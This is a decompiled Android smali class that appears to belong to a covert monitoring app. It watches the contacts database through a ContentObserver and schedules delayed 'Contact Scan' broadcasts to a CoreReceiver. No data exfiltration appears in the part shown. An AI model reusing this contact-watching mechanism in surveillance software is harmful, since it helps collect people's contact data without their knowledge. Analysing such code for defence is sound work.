.class public final Lcom/network/android/monitor/observer/g;
.super Lcom/network/android/monitor/observer/r;


# static fields
.field static a:Z

.field private static final e:[Ljava/lang/String;

.field private static final f:Landroid/net/Uri;

.field private static g:Landroid/os/Handler;


# instance fields
.field b:Ljava/util/Timer;

.field private h:Landroid/database/ContentObserver;

.field private i:I

.field private j:Ljava/util/Map;

.field private k:J

.field private l:Z

.field private m:Z

.field private n:Z

.field private o:J


# direct methods
.method static constructor <clinit>()V
    .locals 3

    const/4 v2, 0x0

    new-array v0, v2, [Ljava/lang/String;

    sput-object v0, Lcom/network/android/monitor/observer/g;->e:[Ljava/lang/String;

    sget-object v0, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    sput-object v0, Lcom/network/android/monitor/observer/g;->f:Landroid/net/Uri;

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "MyContact"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/monitor/observer/g;->g:Landroid/os/Handler;

    sput-boolean v2, Lcom/network/android/monitor/observer/g;->a:Z

    return-void
.end method

.method public constructor <init>(Z)V
    .locals 3

    const/4 v2, 0x0

    invoke-direct {p0}, Lcom/network/android/monitor/observer/r;-><init>()V

    iput v2, p0, Lcom/network/android/monitor/observer/g;->i:I

    new-instance v0, Ljava/util/HashMap;

    invoke-direct {v0}, Ljava/util/HashMap;-><init>()V

    iput-object v0, p0, Lcom/network/android/monitor/observer/g;->j:Ljava/util/Map;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/network/android/monitor/observer/g;->b:Ljava/util/Timer;

    const-wide/32 v0, 0x493e0

    iput-wide v0, p0, Lcom/network/android/monitor/observer/g;->k:J

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/network/android/monitor/observer/g;->l:Z

    iput-boolean v2, p0, Lcom/network/android/monitor/observer/g;->m:Z

    iput-boolean v2, p0, Lcom/network/android/monitor/observer/g;->n:Z

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/network/android/monitor/observer/g;->o:J

    iput-boolean p1, p0, Lcom/network/android/monitor/observer/g;->l:Z

    return-void
.end method


# virtual methods
.method public final a(Lcom/network/android/monitor/a/a;)V
    .locals 4

    invoke-super {p0, p1}, Lcom/network/android/monitor/observer/r;->a(Lcom/network/android/monitor/a/a;)V

    const-string v0, "ContactWatcher start "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    check-cast p1, Lcom/network/e/a/a;

    invoke-virtual {p1}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/monitor/observer/i;->a(Landroid/content/Context;)V

    iget-object v0, p0, Lcom/network/android/monitor/observer/g;->h:Landroid/database/ContentObserver;

    if-nez v0, :cond_0

    invoke-virtual {p1}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v0

    new-instance v1, Lcom/network/android/monitor/observer/h;

    invoke-direct {v1, p0, p1}, Lcom/network/android/monitor/observer/h;-><init>(Lcom/network/android/monitor/observer/g;Lcom/network/e/a/a;)V

    iput-object v1, p0, Lcom/network/android/monitor/observer/g;->h:Landroid/database/ContentObserver;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Lcom/network/android/monitor/observer/g;->f:Landroid/net/Uri;

    const/4 v2, 0x1

    iget-object v3, p0, Lcom/network/android/monitor/observer/g;->h:Landroid/database/ContentObserver;

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v0, "AndroidContactWatcher registerContentObserver "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    :cond_0
    const-string v0, "ContactWatcher start ended "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    return-void
.end method

.method public final a(Lcom/network/e/a/a;)V
    .locals 7

    :try_start_0
    const-string v0, "Contacts service "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-wide v0, p0, Lcom/network/android/monitor/observer/g;->o:J

    const-wide/16 v2, 0x0

    cmp-long v0, v0, v2

    if-eqz v0, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/network/android/monitor/observer/g;->o:J

    sub-long/2addr v0, v2

    const-wide/16 v2, 0x7530

    cmp-long v0, v0, v2

    if-lez v0, :cond_1

    :cond_0
    const-string v0, "Contacts Event start  "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x1

    sput-boolean v0, Lcom/network/android/monitor/observer/g;->a:Z

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lcom/network/android/monitor/observer/g;->o:J

    invoke-virtual {p1}, Lcom/network/e/a/a;->a()Landroid/content/Context;

    move-result-object v1

    const-string v0, "alarm"

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/network/media/CoreReceiver;

    invoke-direct {v2, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v3, "Contact Scan"

    invoke-virtual {v2, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/4 v3, 0x0

    const/4 v4, 0x0

    invoke-static {v1, v3, v2, v4}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v1

    const-string v2, "Contacts scan will be in: 120000"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v2, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const-wide/32 v5, 0x1d4c0

    add-long/2addr v3, v5

    invoke-virtual {v0, v2, v3, v4, v1}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    const-string v0, "Contacts Event end "

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_1
    :goto_0
    return-void

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "Contacts service  listener Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public final a()[Ljava/lang/String;
    .locals 1

    sget-object v0, Lcom/network/android/monitor/observer/g;->e:[Ljava/lang/String;

    return-object v0
.end method
